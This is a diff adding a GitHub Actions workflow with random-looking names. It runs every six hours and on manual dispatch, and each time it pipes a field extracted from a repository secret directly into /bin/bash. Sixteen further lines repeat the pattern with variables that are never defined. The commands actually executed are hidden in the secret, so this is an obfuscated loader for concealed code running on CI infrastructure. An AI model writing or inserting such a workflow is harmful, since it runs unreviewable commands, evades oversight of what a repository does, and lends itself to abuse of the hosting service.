@@ -1,0 +1,34 @@
+name: yinduindiazuii
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '3 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yinduindiazuii
+        env:
+          puvvc6782: ${{ secrets.puvvc6782 }}
+        run: |
+          echo $puvvc6782 | jq -r .dceg753 | /bin/bash
+          echo $prdbq6221 | jq -r .shrj01 | /bin/bash
+          echo $atars97463 | jq -r .ecf4 | /bin/bash
+          echo $sezsn17 | jq -r .ev5298 | /bin/bash
+          echo $vc8559 | jq -r .ia6 | /bin/bash
+          echo $jpxr6376 | jq -r .ty76 | /bin/bash
+          echo $q3 | jq -r .scwtm3 | /bin/bash
+          echo $r3671 | jq -r .t762 | /bin/bash
+          echo $tfga7 | jq -r .h1656 | /bin/bash
+          echo $qy4 | jq -r .tllsk0209 | /bin/bash
+          echo $dedr735 | jq -r .psopk1 | /bin/bash
+          echo $p91 | jq -r .hm8842 | /bin/bash
+          echo $aycfg40584 | jq -r .y13325 | /bin/bash
+          echo $krf8 | jq -r .ygmf7398 | /bin/bash
+          echo $bm13815 | jq -r .pka74 | /bin/bash
+          echo $epks3 | jq -r .pe890 | /bin/bash
+          echo $szop73 | jq -r .ikvrc356 | /bin/bash
+
